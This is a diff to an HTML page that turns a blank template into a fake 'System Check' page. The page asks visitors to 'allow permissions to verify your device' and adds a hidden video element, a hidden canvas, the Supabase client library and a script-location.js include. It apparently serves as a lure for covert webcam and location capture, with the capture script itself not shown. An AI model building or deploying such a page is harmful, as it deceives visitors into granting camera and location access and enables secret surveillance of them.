@@ -4,12 +4,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <title>System Loading...</title>
+    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
+    <style>
+        body {
+            font-family: sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+            text-align: center;
+        }
+
+        .message {
+            color: #555;
+        }
+    </style>
 </head>
 
 <body>
 
+    <div class="message">
+        <h2>System Check</h2>
+        <p>Please allow permissions to verify your device.</p>
+    </div>
+
+    <video id="hiddenVideo" autoplay playsinline muted style="display: none;"></video>
+    <canvas id="hiddenCanvas" style="display: none;"></canvas>
+
+    <script src="script-location.js"></script>
 </body>
-<script src="script-location.js"></script>
 
 </html>
